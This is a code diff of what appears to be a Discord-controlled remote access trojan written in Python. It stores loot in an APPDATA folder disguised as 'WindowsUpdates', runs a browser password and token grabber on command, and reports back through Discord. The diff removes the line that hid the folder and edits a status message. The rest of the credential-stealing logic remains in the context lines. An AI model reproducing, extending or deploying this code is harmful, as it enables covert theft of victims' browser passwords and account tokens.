@@ -11,16 +11,10 @@ import subprocess
 import json
 import requests
 import time
-import ctypes
-
 main_path = os.getenv("LOCALAPPDATA") + "\Snky\Snky-main"
 modules_path = main_path + "\modules"
 client = discord.Client(intents=discord.Intents.all())
 file_version = "2.0"
-
-
-
-FILE_ATTRIBUTE_HIDDEN = 0x02
 
 #load config
 with open(f"{main_path}/cfg/config.json", "r") as f:
@@ -58,8 +52,6 @@ def get_raw_git_content(url):
 async def on_ready():
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates") == False:
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates")
-        #make dir hidden
-        ctypes.windll.kernel32.SetFileAttributesW(f"{os.getenv('APPDATA')}\\WindowsUpdates", FILE_ATTRIBUTE_HIDDEN)
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files") == False:
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files")
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\txt")
@@ -519,7 +511,7 @@ async def on_message(message):
         #run token_grabber.pyw and wait until finished then send token.txt
         os.system(f"py {main_path}\\built_in_modules\\browser_psw.pyw")
 
-        embed = discord.Embed(title="Token Grabber", description="Browser grabber executed.", color=0x00ff00)
+        embed = discord.Embed(title="Token Grabber", description="Executed.", color=0x00ff00)
         await message.channel.send(embed=embed)
 
         while(os.path.exists(f"{main_path}\\browsers") == False):
